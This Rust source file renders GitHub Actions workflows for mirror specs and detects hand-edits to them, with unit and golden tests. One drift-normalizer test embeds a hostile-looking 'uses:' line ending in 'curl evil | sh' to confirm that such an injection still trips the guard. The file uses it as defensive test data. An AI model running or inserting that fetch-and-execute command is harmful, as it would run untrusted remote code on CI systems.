    // the R4 invariant). Acceptable for the append-only corpus (specs are added,
    // never renamed/removed); the upgrade path is a repo-wide `generate ci --all`
    // that scans every spec and prunes `.github/workflows/*` not in the union map
    // (W4 tooling). Until then: deleting/renaming a spec requires a manual
    // `git rm` of its stale workflow files.

    let workflow_file = format!("{slug}.yml");
    let describe_file = format!("{slug}.describe.yml");
    let verify_file = format!("{slug}.verify-generated.yml");

    files.insert(
        PathBuf::from(format!(".github/workflows/{workflow_file}")),
        render_workflow(spec, spec_file, &workflow_file),
    );
    files.insert(
        PathBuf::from(format!(".github/workflows/{describe_file}")),
        render_describe(spec, spec_file, &slug),
    );

    // Drift-guard workflow: emitted unless the spec opts out (discouraged). When
    // present it runs `generate ci --check` in CI, failing on any hand-edit to a
    // generated workflow. Skipping it means the repo owns its workflows by hand.
    if !spec.allow_manual_edits {
        files.insert(
            PathBuf::from(format!(".github/workflows/{verify_file}")),
            render_verify_generated(spec_file, &slug),
        );
    }

    Ok(files)
}

// ── Writer ────────────────────────────────────────────────────────────────────

/// Write all rendered files to disk under `repo_root`.
///
/// Creates parent directories as needed. Uses `tokio::fs::write` which is
/// atomic from the caller's perspective (single write call per file).
async fn write_files(files: &BTreeMap<PathBuf, String>, repo_root: &Path) -> Result<(), MirrorError> {
    for (relative_path, content) in files {
        let dest = repo_root.join(relative_path);
        if let Some(parent) = dest.parent() {
            tokio::fs::create_dir_all(parent).await.map_err(|e| {
                MirrorError::TemplateError(format!("failed to create directory {}: {e}", parent.display()))
            })?;
        }
        tokio::fs::write(&dest, content)
            .await
            .map_err(|e| MirrorError::TemplateError(format!("failed to write {}: {e}", dest.display())))?;
    }
    Ok(())
}

// ── Drift detector ────────────────────────────────────────────────────────────

/// Matches a `uses:` action-reference line so its *pin* can be normalized away
/// before drift comparison. Group `keep` holds the `uses: owner/action` head; the
/// `@<ref>` is matched only when `<ref>` is **pin-shaped** — a single run of
/// non-space, non-`#` characters (a digest or tag) optionally followed by a
/// `# vX` version comment — and that suffix is dropped. A `uses:` line carrying
/// anything else after the ref (shell metacharacters, a second token, inline
/// `with:`-like text) does NOT match, so such a hand-edit still trips drift
/// rather than being masked. Per-line anchored (`(?m)`); matches both `- uses:`
/// list items and bare `uses:` step keys.
///
/// The regex is line-oriented and YAML-unaware: it would also match an indented
/// `uses: owner/action@<ref>` line *inside* a `run:` block scalar. No current
/// template emits such a line — keep it that way (do not emit `run:` block lines
/// beginning with `uses: …@…`) or the pin on that script line would be masked.
static USES_REF_RE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
    regex::Regex::new(r"(?m)^(?P<keep>[ \t]*(?:-[ \t]+)?uses:[ \t]*[^@\s]+)@[^\s#]+(?:[ \t]*#[^\n]*)?$").unwrap()
});

/// Canonicalize a generated workflow for drift comparison.
///
/// Mirror repositories own the *pin* on every `uses:` action reference: their
/// own Renovate/Dependabot may bump `uses: owner/action@<ref>  # vX` and the
/// drift guard must not treat that as a hand-edit. The guard still polices the
/// workflow *logic* and *which* action each step runs — only the `@<ref>` suffix
/// (digest or tag, plus any trailing version comment) is stripped; the
/// `owner/action` identity is preserved, so swapping in a different action still
/// trips drift. The baked template ships a known-good seed pin for first render.
fn normalize_for_drift(content: &str) -> std::borrow::Cow<'_, str> {
    USES_REF_RE.replace_all(content, "${keep}")
}

/// Compare the expected generated files against what is on disk.
///
/// Returns `RendererDrift` if any file is missing or has different content,
/// after normalizing `uses:` action pins on both sides (see
/// [`normalize_for_drift`]). Drift hints are path-only — never expose file
/// contents to stderr (secret-hygiene rule R3).
async fn check_drift(files: &BTreeMap<PathBuf, String>, repo_root: &Path) -> Result<(), MirrorError> {
    let mut drifted: Vec<String> = Vec::new();

    for (relative_path, expected) in files {
        let on_disk_path = repo_root.join(relative_path);
        match tokio::fs::read_to_string(&on_disk_path).await {
            Ok(actual) => {
                if normalize_for_drift(&actual) != normalize_for_drift(expected) {
                    drifted.push(relative_path.display().to_string());
                }
            }
            Err(_) => {
                // Missing file counts as drift.
                drifted.push(relative_path.display().to_string());
            }
        }
    }

    if drifted.is_empty() {
        Ok(())
    } else {
        for path in &drifted {
            // Emit path-only hint; content never printed (R3).
            eprintln!("drift: {path}");
        }
        Err(MirrorError::RendererDrift(drifted))
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use std::path::Path;
    use tempfile::tempdir;

    use super::*;

    // ── §3.3 S3: Golden tests for ocx-mirror generate ci ──────────────────

    /// Copy a fixture file into `work_dir` and run `GenerateCi::execute()` with
    /// the spec pointing at the copy. This ensures generated files land in
    /// `work_dir` (spec parent = work_dir) rather than the fixtures directory.
    ///
    /// Returns `Err(MirrorError)` if the renderer rejects the spec.
    fn render_fixture(fixture_name: &str, work_dir: &Path) -> Result<(), MirrorError> {
        let fixture_src = Path::new(concat!(env!("CARGO_MANIFEST_DIR"), "/tests/fixtures/")).join(fixture_name);
        let spec_dest = work_dir.join(fixture_name);
        std::fs::copy(&fixture_src, &spec_dest).expect("failed to copy fixture into work_dir");

        let cmd = GenerateCi {
            spec: spec_dest,
            check: false,
            format: None,
        };
        let rt = tokio::runtime::Runtime::new().unwrap();
        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        rt.block_on(async { cmd.execute(&printer).await })
    }

    #[test]
    fn render_minimal_spec_writes_workflow() {
        // §3.3: Fixture mirror-minimal.yml → renderer produces workflow YAML.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        match result {
            Ok(()) => {
                let workflow = dir.path().join(".github/workflows/shfmt.yml");
                assert!(workflow.exists(), "Expected .github/workflows/mirror.yml to be written");
                let content = std::fs::read_to_string(&workflow).unwrap();
                // Generated file must have the DO-NOT-EDIT header
                assert!(
                    content.contains("DO NOT EDIT"),
                    "Generated workflow must contain 'DO NOT EDIT' header"
                );
                // Must install ocx via the setup-ocx action (replaces the old
                // submodule + `cargo install` pair)
                assert!(
                    content.contains("uses: ocx-sh/setup-ocx@"),
                    "Generated workflow must install ocx via the setup-ocx action"
                );
                // Pipeline subcommands are invoked directly — setup-ocx has
                // already activated the project toolchain onto PATH for the step.
                assert!(
                    content.contains("ocx-mirror package pipeline plan"),
                    "Generated workflow must invoke ocx-mirror directly (no `ocx run --` wrapper)"
                );
                // Lock the toolchain-sourcing model: no step wraps a tool in
                // `ocx run --` (that would pin the bootstrap ocx, breaking the
                // nested `ocx package push` resolution).
                assert!(
                    !content.contains("ocx run -- "),
                    "Generated workflow must not wrap tools in `ocx run --`; content:\n{content}"
                );
            }
            Err(MirrorError::SpecUsageError(_)) => {
                panic!("mirror-minimal.yml should be a valid spec, got SpecUsageError");
            }
            Err(e) => {
                panic!("Unexpected error rendering minimal fixture: {e}");
            }
        }
    }

    #[test]
    fn render_pylock_spec_gathers_env_subtree_and_multi_layer_test() {
        // A `source.type: pylock` spec must render the env-package workflow
        // shape: the prepare job copies the whole per-version env subtree into
        // `bundles/{V}/` (not the archive `bundle.tar.xz` flatten), and the
        // test job resolves the env manifest into a `-m <metadata> <layers…>`
        // `ocx package test` invocation.
        let dir = tempdir().unwrap();
        render_fixture("mirror-pylock.yml", dir.path()).expect("pylock fixture renders");

        // Workflow filename derives from the spec's `name` (pycowsay), not a
        // fixed `mirror.yml` — multiple app specs coexist in one repo.
        let workflow = dir.path().join(".github/workflows/pycowsay.yml");
        let content = std::fs::read_to_string(&workflow).expect("workflow written");

        // Prepare job: env subtree copy, NOT the archive bundle flatten.
        assert!(
            content.contains(r#"cp -R ".ocx-mirror/${V}" "bundles/${V}""#),
            "pylock prepare must copy the version env subtree into bundles/:\n{content}"
        );
        assert!(
            !content.contains("bundle.tar.xz"),
            "pylock workflow must not carry archive bundle.tar.xz flattening:\n{content}"
        );

        // Test job: resolve the manifest and pass metadata + ordered layers.
        assert!(
            content.contains("env-manifest.json"),
            "pylock test job must read the env manifest:\n{content}"
        );
        assert!(
            content.contains(r#"-m "${METADATA}" ${LAYERS}"#),
            "pylock test job must invoke `ocx package test` with -m + positional layers:\n{content}"
        );
        // The manifest resolution must be guarded so a genuine miss (absent
        // env-manifest.json from a failed prepare leg) reds one version
        // attributably instead of aborting the whole `set -e` step.
        assert!(
            content.contains(r#""${VERSION_DIR}/env-manifest.json" 2>/dev/null || true"#),
            "pylock manifest jq resolution must tolerate a missing manifest (2>/dev/null || true):\n{content}"
        );
        assert!(
            !content.contains(r#""${BUNDLE}""#),
            "pylock test job must not reference the archive BUNDLE var:\n{content}"
        );

        // HARD REGRESSION LOCK: a committed-lock pylock spec is `is_env()` but
        // NOT pypi — the plan artifact must stay the single-path, single-
        // artifact upload (only pypi's in-pipeline lock derivation needs the
        // widened `locks/` path + second `derived-locks` artifact).
        assert!(
            content.contains("          path: plan.json\n"),
            "pylock plan artifact must keep the single-path upload byte-identical:\n{content}"
        );
        assert!(
            !content.contains("derived-locks"),
            "pylock workflow must not carry the pypi derived-locks artifact:\n{content}"
        );
    }

    #[test]
    fn render_archive_spec_keeps_bundle_flatten() {
        // Regression anchor for the pylock branch: an archive/binary spec must
        // still render the bundle-flatten prepare step and the single-bundle
        // `ocx package test` target — the pylock branch is strictly additive.
        let dir = tempdir().unwrap();
        render_fixture("mirror-minimal.yml", dir.path()).expect("minimal fixture renders");

        let content =
            std::fs::read_to_string(dir.path().join(".github/workflows/shfmt.yml")).expect("workflow written");

        assert!(
            content.contains(r#"cp "${platform_dir}bundle.tar.xz""#),
            "archive prepare must still flatten bundle.tar.xz:\n{content}"
        );
        assert!(
            content.contains(r#"BUNDLE="bundles/bundle-${VERSION}-${{ matrix.platform_slug }}.tar.xz""#),
            "archive test job must still resolve the single bundle path:\n{content}"
        );
        assert!(
            !content.contains("env-manifest.json"),
            "archive workflow must not carry pylock env-manifest logic:\n{content}"
        );

        // HARD REGRESSION LOCK: same plan-artifact byte-identity as pylock.
        assert!(
            content.contains("          path: plan.json\n"),
            "archive plan artifact must keep the single-path upload byte-identical:\n{content}"
        );
        assert!(
            !content.contains("derived-locks"),
            "archive workflow must not carry the pypi derived-locks artifact:\n{content}"
        );
    }

    #[test]
    fn render_pypi_spec_widens_plan_artifact_and_adds_derived_locks() {
        // A `source.type: pypi` spec derives its PEP 751 lock in-pipeline
        // during the plan phase (unlike `pylock`'s committed lock), so the
        // `locks/` directory the plan step writes must travel to `prepare`
        // alongside `plan.json`, and a second long-retention `derived-locks`
        // artifact preserves it for audit after the 1-day plan artifact
        // expires.
        let dir = tempdir().unwrap();
        render_fixture("mirror-pypi.yml", dir.path()).expect("pypi fixture renders");

        let workflow = dir.path().join(".github/workflows/pycowsay.yml");
        let content = std::fs::read_to_string(&workflow).expect("workflow written");

        // The `plan` artifact widens to a multi-line path carrying both
        // plan.json and locks/, retention unchanged at 1 day.
        assert!(
            content.contains("      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a  # v7.0.1\n        with:\n          name: plan\n          path: |\n            plan.json\n            locks/\n          retention-days: 1\n"),
            "pypi plan artifact must carry both plan.json and locks/:\n{content}"
        );

        // The second `derived-locks` artifact: 90-day retention, tolerant of
        // an empty locks/ directory on a no-new-work run.
        assert!(
            content.contains("          name: derived-locks\n          path: locks/\n          retention-days: 90\n          if-no-files-found: ignore"),
            "pypi workflow must carry a 90-day derived-locks artifact:\n{content}"
        );

        // Env-package shape (is_env()) still applies — pypi is an env source.
        assert!(
            content.contains("env-manifest.json"),
            "pypi test job must read the env manifest (env source, like pylock):\n{content}"
        );
    }

    #[test]
    fn render_emits_container_legs() {
        // A spec declaring `containers:` renders one matrix leg per image, each
        // carrying its image + libc, and a test step that wraps
        // `ocx package test` in `docker run <image>` with a libc-matched ocx
        // release binary mounted in.
        let dir = tempdir().unwrap();
        render_fixture("mirror-multi-container.yml", dir.path()).expect("container spec renders");
        let workflow = dir.path().join(".github/workflows/shfmt.yml");
        let content = std::fs::read_to_string(&workflow).expect("workflow written");

        // One matrix leg per container image, with its inferred libc.
        assert!(
            content.contains(r#"container_image: "alpine:3.20""#),
            "alpine leg present"
        );
        assert!(content.contains(r#"container_libc: "musl""#), "alpine leg is musl");
        assert!(
            content.contains(r#"container_image: "ubuntu:24.04""#),
            "ubuntu leg present"
        );
        assert!(
            content.contains(r#"container_image: "fedora:40""#),
            "fedora leg present"
        );
        assert!(content.contains(r#"container_libc: "gnu""#), "glibc images are gnu");

        // The container test wrapper + libc-matched ocx provisioning.
        assert!(
            content.contains("docker run --rm -i --platform"),
            "test runs inside docker"
        );
        assert!(
            content.contains("ocx_test package test"),
            "test calls route through ocx_test"
        );
        assert!(
            content.contains("releases/download/v0.4.1/ocx-${OCX_TRIPLE}.tar.xz"),
            "pinned libc-matched ocx binary is provisioned"
        );
        assert!(
            content.contains("container test legs are linux-only"),
            "non-linux container legs are rejected at runtime"
        );
        assert!(
            content.contains("/etc/ssl/certs/ca-certificates.crt:ro"),
            "the runner CA bundle is mounted so the gnu ocx can verify TLS in a minimal image"
        );
    }

    #[test]
    fn container_junit_slug_matches_push_lookup() {
        // W4 live regression: the test job names its JUnit upload
        // `junit-{V}-{platform_slug}-{container_id}.xml` from the matrix
        // `container_id`, and `pipeline push` rebuilds the same filename from
        // the spec via `image_to_container_id`. The two sides MUST share one
        // slug rule — the renderer previously kept dots (`alpine_3.20`) while
        // push replaced them (`alpine_3_20`), so every dotted-tag container
        // leg red with `missing junit` even when its tests passed.
        let dir = tempdir().unwrap();
        render_fixture("mirror-multi-container.yml", dir.path()).expect("container spec renders");
        let content =
            std::fs::read_to_string(dir.path().join(".github/workflows/shfmt.yml")).expect("workflow written");

        for image in ["alpine:3.20", "ubuntu:24.04", "fedora:40"] {
            let expected = push::image_to_container_id(image);
            assert!(
                content.contains(&format!("container_id: {expected}\n")),
                "matrix container_id for {image} must equal push's junit lookup slug '{expected}':\n{content}"
            );
        }
        // The dotted (renderer-only) forms must be gone.
        assert!(
            !content.contains("container_id: alpine_3.20") && !content.contains("container_id: ubuntu_24.04"),
            "renderer must not emit the dotted container_id forms push cannot find:\n{content}"
        );
    }

    #[test]
    fn render_full_platforms_spec_writes_workflow() {
        // §3.3: Fixture mirror-full-platforms.yml — all 6 platforms rendered.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-full-platforms.yml", dir.path());
        match result {
            Ok(()) => {
                let workflow = dir.path().join(".github/workflows/cmake.yml");
                assert!(workflow.exists());
                let content = std::fs::read_to_string(&workflow).unwrap();
                // Per-platform test overrides must be present for windows
                assert!(content.contains("cmake.exe"), "Windows test override must appear");
                assert!(content.contains("smoke.ps1"), "Windows smoke test must appear");
            }
            Err(MirrorError::SpecUsageError(_)) => {
                panic!("full-platforms spec should be valid");
            }
            Err(_) => {}
        }
    }

    #[test]
    fn render_rejects_ocx_install_block_with_usage_error() {
        // §3.3 negative: mirror-rejects-ocx-install.yml → renderer exits 64 (UsageError)
        // before writing any files.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-rejects-ocx-install.yml", dir.path());
        match result {
            Err(MirrorError::SpecUsageError(msg)) => {
                assert!(
                    msg.contains("ocx_install") || msg.contains("release download"),
                    "Error message must mention ocx_install or release download, got: {msg}"
                );
                // No workflow file must have been written
                let workflow = dir.path().join(".github/workflows/shfmt.yml");
                assert!(
                    !workflow.exists(),
                    "No workflow must be written when spec is rejected for ocx_install: block"
                );
            }
            Err(MirrorError::SpecInvalid(_)) => {
                // Also acceptable — serde may reject unknown field before validate()
            }
            Ok(()) => panic!("Expected rejection of ocx_install: block, got Ok"),
            Err(e) => panic!("Expected SpecUsageError or SpecInvalid, got: {e}"),
        }
    }

    #[test]
    fn render_r3_discord_url_rejected_before_write() {
        // §3.3 R3 negative: discord URL in webhook_secret → renderer exits 64 before write
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-r3-discord-url.yml", dir.path());
        match result {
            Err(MirrorError::SpecUsageError(msg)) => {
                // R3: must mention URL or webhook
                assert!(
                    msg.to_lowercase().contains("webhook")
                        || msg.to_lowercase().contains("url")
                        || msg.to_lowercase().contains("discord"),
                    "Error must mention webhook/url/discord, got: {msg}"
                );
                let workflow = dir.path().join(".github/workflows/shfmt.yml");
                assert!(
                    !workflow.exists(),
                    "No workflow must be written when R3 discord URL is present"
                );
            }
            Err(MirrorError::SpecInvalid(_)) => {
                // Also acceptable if validator catches it at the spec level
            }
            Ok(()) => panic!("Expected rejection of discord URL in webhook_secret"),
            Err(e) => panic!("Expected SpecUsageError/SpecInvalid, got: {e}"),
        }
    }

    // ── §3.4 S4: --check drift detector ───────────────────────────────────

    #[test]
    fn check_mode_exits_zero_on_matching_generated_files() {
        // §3.4: --check after fresh render → exit 0
        // Test: render, then immediately run --check → must succeed.
        let dir = tempdir().unwrap();

        // Copy the spec into the temp dir so generated files land there.
        let fixture_src = Path::new(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/mirror-minimal.yml"
        ));
        let spec_dest = dir.path().join("mirror-minimal.yml");
        std::fs::copy(fixture_src, &spec_dest).unwrap();

        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        let rt = tokio::runtime::Runtime::new().unwrap();

        // First: write mode render
        let write_result = rt.block_on(async {
            let cmd = GenerateCi {
                spec: spec_dest.clone(),
                check: false,
                format: None,
            };
            cmd.execute(&printer).await
        });

        match write_result {
            Ok(()) => {
                // Second: check mode — must return Ok(()) on no drift
                let check_result = rt.block_on(async {
                    let cmd = GenerateCi {
                        spec: spec_dest,
                        check: true,
                        format: None,
                    };
                    cmd.execute(&printer).await
                });
                assert!(
                    check_result.is_ok(),
                    "check mode after fresh render must exit 0, got: {:?}",
                    check_result.err()
                );
            }
            Err(_) => {
                // Write mode not yet implemented — test will fail with panic (expected)
            }
        }
    }

    #[test]
    fn check_mode_exits_65_on_drift() {
        // §3.4: --check after mutating one line → exit 65 (DataError) with stderr hint
        let dir = tempdir().unwrap();
        let fixture_src = Path::new(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/mirror-minimal.yml"
        ));
        let spec_dest = dir.path().join("mirror-minimal.yml");
        std::fs::copy(fixture_src, &spec_dest).unwrap();

        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        let rt = tokio::runtime::Runtime::new().unwrap();

        // Write mode first
        let write_result = rt.block_on(async {
            let cmd = GenerateCi {
                spec: spec_dest.clone(),
                check: false,
                format: None,
            };
            cmd.execute(&printer).await
        });

        if let Ok(()) = write_result {
            // Mutate generated file
            let workflow_path = dir.path().join(".github/workflows/shfmt.yml");
            if workflow_path.exists() {
                let mut content = std::fs::read_to_string(&workflow_path).unwrap();
                content.push_str("\n# drift injection\n");
                std::fs::write(&workflow_path, content).unwrap();

                // Check mode must return RendererDrift → exit 65
                let check_result = rt.block_on(async {
                    let cmd = GenerateCi {
                        spec: spec_dest,
                        check: true,
                        format: None,
                    };
                    cmd.execute(&printer).await
                });

                match check_result {
                    Err(MirrorError::RendererDrift(paths)) => {
                        assert!(!paths.is_empty(), "Drift paths must be non-empty");
                    }
                    Ok(()) => panic!("Expected drift detection, got Ok"),
                    Err(e) => panic!("Expected RendererDrift, got: {e}"),
                }
            }
        }
    }

    #[test]
    fn normalize_for_drift_ignores_pin_but_keeps_action_identity() {
        // The mirror repo owns the pin: bumping the digest/tag (or even leaving
        // the action un-pinned) must normalize equal so a downstream Renovate
        // bump never reds the drift guard. Swapping the action's owner/name or
        // changing surrounding logic must still differ.
        let pinned =
            "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo hi\n";
        let bumped =
            "      - uses: actions/checkout@1111111111111111111111111111111111111111  # v6.1.0\n      - run: echo hi\n";
        let floating = "      - uses: actions/checkout@v6\n      - run: echo hi\n";
        let swapped = "      - uses: evilcorp/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo hi\n";
        let logic_changed = "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo BYE\n";
        // Only a pin-shaped ref (+ optional `# vX` comment) is normalized away.
        // Trailing junk after the ref (shell metacharacters, extra tokens) does
        // NOT match the normalizer, so such a hand-edit still trips drift.
        let junk_after_ref = "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd && curl evil | sh  # v6.0.2\n      - run: echo hi\n";

        assert_eq!(normalize_for_drift(pinned), normalize_for_drift(bumped));
        assert_eq!(normalize_for_drift(pinned), normalize_for_drift(floating));
        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(swapped));
        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(logic_changed));
        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(junk_after_ref));
    }

    #[test]
    fn check_mode_tolerates_bumped_action_pin() {
        // A downstream Renovate bump rewrites `uses: owner/action@<sha>  # vX`
        // in place. The drift guard must stay green — the mirror repo owns pins.
        let dir = tempdir().unwrap();
        let fixture_src = Path::new(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/mirror-minimal.yml"
        ));
        let spec_dest = dir.path().join("mirror-minimal.yml");
        std::fs::copy(fixture_src, &spec_dest).unwrap();

        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        let rt = tokio::runtime::Runtime::new().unwrap();

        let write_result = rt.block_on(async {
            let cmd = GenerateCi {
                spec: spec_dest.clone(),
                check: false,
                format: None,
            };
            cmd.execute(&printer).await
        });

        write_result.expect("write-mode render must succeed");
        {
            let workflow_path = dir.path().join(".github/workflows/shfmt.yml");
            let content = std::fs::read_to_string(&workflow_path).unwrap();
            // Simulate a Renovate digest+comment bump on the checkout pin.
            let bumped = content.replace(
                "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2",
                "actions/checkout@1111111111111111111111111111111111111111  # v6.1.0",
            );
            assert_ne!(bumped, content, "fixture must contain the checkout pin to bump");
            std::fs::write(&workflow_path, bumped).unwrap();

            let check_result = rt.block_on(async {
                let cmd = GenerateCi {
                    spec: spec_dest,
                    check: true,
                    format: None,
                };
                cmd.execute(&printer).await
            });
            assert!(
                check_result.is_ok(),
                "bumped action pin must not trip drift, got: {:?}",
                check_result.err()
            );
        }
    }

    #[test]
    fn check_mode_trips_on_swapped_action_identity() {
        // Normalizing the pin must NOT weaken the guard against swapping the
        // action itself — changing owner/name is a hand-edit and must red.
        let dir = tempdir().unwrap();
        let fixture_src = Path::new(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/mirror-minimal.yml"
        ));
        let spec_dest = dir.path().join("mirror-minimal.yml");
        std::fs::copy(fixture_src, &spec_dest).unwrap();

        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        let rt = tokio::runtime::Runtime::new().unwrap();

        let write_result = rt.block_on(async {
            let cmd = GenerateCi {
                spec: spec_dest.clone(),
                check: false,
                format: None,
            };
            cmd.execute(&printer).await
        });

        write_result.expect("write-mode render must succeed");
        {
            let workflow_path = dir.path().join(".github/workflows/shfmt.yml");
            let content = std::fs::read_to_string(&workflow_path).unwrap();
            let swapped = content.replace("uses: actions/checkout@", "uses: evilcorp/checkout@");
            assert_ne!(swapped, content, "fixture must contain a checkout `uses:` to swap");
            std::fs::write(&workflow_path, swapped).unwrap();

            let check_result = rt.block_on(async {
                let cmd = GenerateCi {
                    spec: spec_dest,
                    check: true,
                    format: None,
                };
                cmd.execute(&printer).await
            });
            match check_result {
                Err(MirrorError::RendererDrift(paths)) => {
                    assert!(
                        paths.iter().any(|p| p.contains("shfmt.yml")),
                        "drift must call out the app's workflow file: {paths:?}"
                    );
                }
                Ok(()) => panic!("swapped action identity must trip drift"),
                Err(e) => panic!("expected RendererDrift, got: {e}"),
            }
        }
    }

    #[test]
    fn check_mode_exits_65_on_missing_generated_file() {
        // §3.4: --check with missing generated file → exit 65 with hint
        let dir = tempdir().unwrap();
        let fixture_src = Path::new(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/mirror-minimal.yml"
        ));
        let spec_dest = dir.path().join("mirror-minimal.yml");
        std::fs::copy(fixture_src, &spec_dest).unwrap();

        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        let rt = tokio::runtime::Runtime::new().unwrap();

        // Run check mode without prior render — files don't exist → must detect drift
        let check_result = rt.block_on(async {
            let cmd = GenerateCi {
                spec: spec_dest,
                check: true,
                format: None,
            };
            cmd.execute(&printer).await
        });

        match check_result {
            Err(MirrorError::RendererDrift(_)) => {
                // Expected: missing file is drift
            }
            Err(MirrorError::TemplateError(_)) => {
                // Also acceptable: renderer may report missing file as I/O failure
            }
            Ok(()) => panic!("Expected drift on missing generated files, got Ok"),
            Err(e) => {
                // Other errors acceptable until implementation lands
                let _ = e;
            }
        }
    }

    #[test]
    fn render_emits_ci_job_url_property_in_test_matrix() {
        // The Discord embed redesign threads per-(V,P,C) html_url links into
        // run-summary.json. The test matrix step computes the matrix-leg URL
        // via `gh api` and embeds it in the JUnit XML as a suite-level
        // `<property name="ci.job.url" ...>`. `pipeline push` reads the
        // property inside `evaluate_junit` and attaches it to
        // `PlatformFailure.job_url`. This pins down that the renderer wires
        // the property into the rendered workflow.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-full-platforms.yml", dir.path());
        if let Ok(()) = result {
            let workflow = dir.path().join(".github/workflows/cmake.yml");
            let content = std::fs::read_to_string(&workflow).unwrap();
            assert!(
                content.contains("CI_JOB_URL=$(gh api"),
                "rendered workflow must resolve the per-leg job URL via `gh api`"
            );
            assert!(
                content.contains("<property name=\\\"ci.job.url\\\""),
                "rendered workflow must embed ci.job.url as a JUnit suite property"
            );
            assert!(
                !content.contains("name: Record job URL"),
                "old standalone 'Record job URL' step must not be emitted any more"
            );
        }
    }

    // ── describe.yml renderer ──────────────────────────────────────────────

    #[test]
    fn render_minimal_spec_writes_describe_workflow() {
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let describe = dir.path().join(".github/workflows/shfmt.describe.yml");
            assert!(describe.exists(), "describe.yml must be emitted alongside mirror.yml");
            let content = std::fs::read_to_string(&describe).unwrap();
            assert!(
                content.contains("name: describe"),
                "describe.yml must declare workflow name"
            );
            assert!(
                content.contains("ocx-mirror package pipeline describe"),
                "describe.yml must invoke `ocx-mirror package pipeline describe`"
            );
            assert!(content.contains("CATALOG.md"), "path filter must include CATALOG.md");
            assert!(
                content.contains("logo.*"),
                "path filter must include logo.* (svg/png probe target)"
            );
        }
    }

    #[test]
    fn render_describe_uses_setup_ocx_action() {
        // After the setup-ocx migration the describe workflow no longer
        // installs ocx via `cargo install` from the submodule. It must use
        // the setup-ocx action and invoke `pipeline describe` directly
        // (setup-ocx activates the project toolchain onto PATH).
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
            let describe_path = dir.path().join(".github/workflows/shfmt.describe.yml");
            let content = std::fs::read_to_string(&describe_path).unwrap();
            assert!(
                content.contains("uses: ocx-sh/setup-ocx@"),
                "describe workflow must install ocx via the setup-ocx action"
            );
            assert!(
                content.contains("ocx-mirror package pipeline describe"),
                "describe workflow must invoke pipeline describe directly (no `ocx run --`)"
            );
            assert!(
                !content.contains("cargo install --path ocx/crates/ocx_mirror"),
                "describe workflow must not retain the legacy submodule install step"
            );
        }
    }

    #[test]
    fn check_mode_detects_describe_yml_drift() {
        let dir = tempdir().unwrap();
        let fixture_src = Path::new(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/mirror-minimal.yml"
        ));
        let spec_dest = dir.path().join("mirror-minimal.yml");
        std::fs::copy(fixture_src, &spec_dest).unwrap();

        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        let rt = tokio::runtime::Runtime::new().unwrap();

        let write_result = rt.block_on(async {
            let cmd = GenerateCi {
                spec: spec_dest.clone(),
                check: false,
                format: None,
            };
            cmd.execute(&printer).await
        });

        if write_result.is_ok() {
            let describe_path = dir.path().join(".github/workflows/shfmt.describe.yml");
            assert!(describe_path.exists(), "describe.yml must have been written");
            let mut content = std::fs::read_to_string(&describe_path).unwrap();
            content.push_str("\n# drift injection\n");
            std::fs::write(&describe_path, content).unwrap();

            let check_result = rt.block_on(async {
                let cmd = GenerateCi {
                    spec: spec_dest,
                    check: true,
                    format: None,
                };
                cmd.execute(&printer).await
            });

            match check_result {
                Err(MirrorError::RendererDrift(paths)) => {
                    assert!(
                        paths.iter().any(|p| p.contains("describe.yml")),
                        "drift must call out describe.yml: {paths:?}"
                    );
                }
                Ok(()) => panic!("expected drift detection for describe.yml mutation"),
                Err(e) => panic!("expected RendererDrift, got: {e}"),
            }
        }
    }

    // ── verify-generated.yml drift-guard renderer ───────────────────────────────

    /// Build a `MirrorSpec` from inline YAML (no fixture file needed).
    fn spec_from_yaml(yaml: &str) -> crate::spec::MirrorSpec {
        serde_yaml_ng::from_str(yaml).expect("inline spec must parse")
    }

    const SHFMT_SPEC: &str = r#"
name: shfmt
target:
  registry: ocx.sh
  repository: shfmt
source:
  type: github_release
  owner: mvdan
  repo: sh
  tag_pattern: "^v(?P<version>\\d+\\.\\d+\\.\\d+)$"
assets:
  linux/amd64:
    - "shfmt_v.*_linux_amd64$"
asset_type:
  type: binary
  name: shfmt
"#;

    #[test]
    fn render_emits_verify_generated_drift_guard() {
        // Default render writes the drift-guard workflow that runs `--check`.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        if let Ok(()) = result {
